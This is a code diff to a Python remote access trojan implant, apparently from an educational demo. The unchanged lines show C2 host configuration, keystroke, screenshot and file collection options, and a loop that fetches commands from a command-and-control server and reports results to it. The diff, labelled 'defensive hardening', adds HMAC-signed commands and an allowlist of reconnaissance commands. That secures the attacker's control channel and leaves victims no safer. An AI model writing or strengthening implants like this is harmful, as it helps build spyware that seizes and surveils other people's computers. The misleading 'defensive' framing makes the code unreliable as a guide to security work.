@@ -48,12 +48,39 @@ import json
 import sys
 import os
 import subprocess
+import hashlib
+import hmac
+import shlex
 import random
 import glob
 import tempfile
 
 # Existing config imports
 from config import C2_HOST, C2_PORT, KILL_SWITCH, RAT_NAME
+
+# ===== COMMAND SIGNING KEY (defensive hardening) =====
+# Must match COMMAND_SIGNING_KEY on the server. Commands are HMAC-signed so a
+# network MitM cannot inject or tamper with remote commands.
+COMMAND_SIGNING_KEY = os.environ.get(
+    "COMMAND_SIGNING_KEY", "rmit-edu-demo-command-signing-key"
+).encode("utf-8")
+
+
+# Allowlist of safe remote commands. Only prefixes listed here are executed.
+# Anything else is refused and reported back as a violation. This replaces the
+# previous subprocess.run(..., shell=True) which was an arbitrary RCE sink.
+ALLOWED_COMMANDS = {
+    "whoami", "hostname", "ipconfig", "systeminfo", "tasklist", "netstat",
+    "arp", "route", "dir", "echo", "ver", "ping", "tracert", "nslookup",
+}
+
+
+def verify_command_signature(cmd, signature):
+    """Return True if the HMAC-SHA256 of cmd matches the provided signature."""
+    if not signature:
+        return False
+    expected = hmac.new(COMMAND_SIGNING_KEY, cmd.encode("utf-8"), hashlib.sha256).hexdigest()
+    return hmac.compare_digest(expected, signature)
 from config import COLLECT_SYSTEM_INFO, COLLECT_FILES, COLLECT_SCREENSHOTS, COLLECT_KEYSTROKES
 from config import KEYLOG_INTERVAL_SECONDS, SCREENSHOT_INTERVAL_SECONDS
 
@@ -338,11 +365,51 @@ def phase8_command_loop(stop_event):
             resp = requests.get(f"{C2_URL}/commands/{RAT_NAME}", timeout=5)
             if resp.status_code == 200:
                 commands = resp.json().get("commands", [])
-                for cmd in commands:
-                    print(f"[*] Executing remote command: {cmd[:50]}...")
+                for item in commands:
+                    # Accept both plain strings (legacy) and {command, signature}
+                    if isinstance(item, dict):
+                        cmd = item.get("command", "")
+                        sig = item.get("signature", "")
+                    else:
+                        cmd = item
+                        sig = None
+
+                    print(f"[*] Received remote command: {cmd[:50]}...")
+
+                    # (1) Verify integrity signature before execution.
+                    if not verify_command_signature(cmd, sig):
+                        print("[!] Command signature INVALID - refusing to execute")
+                        send_to_c2("data/cmd_result", {
+                            "rat_id": RAT_NAME,
+                            "data": {
+                                "command": cmd,
+                                "stdout": "",
+                                "stderr": "Command signature verification failed",
+                                "return_code": -1,
+                            }
+                        })
+                        continue
+
+                    # (2) Enforce allowlist (replaces shell=True RCE sink).
+                    executable = cmd.strip().split()[0].lower() if cmd.strip() else ""
+                    if executable not in ALLOWED_COMMANDS:
+                        print(f"[!] Command '{executable}' not on allowlist - refused")
+                        send_to_c2("data/cmd_result", {
+                            "rat_id": RAT_NAME,
+                            "data": {
+                                "command": cmd,
+                                "stdout": "",
+                                "stderr": f"Command '{executable}' not allowed by policy",
+                                "return_code": -1,
+                            }
+                        })
+                        continue
+
+                    # (3) Execute safely: shlex.split (no shell), argv list.
                     try:
+                        argv = shlex.split(cmd)
                         result = subprocess.run(
-                            cmd, shell=True,
+                            argv,
                             capture_output=True, text=True,
                             timeout=30
                         )
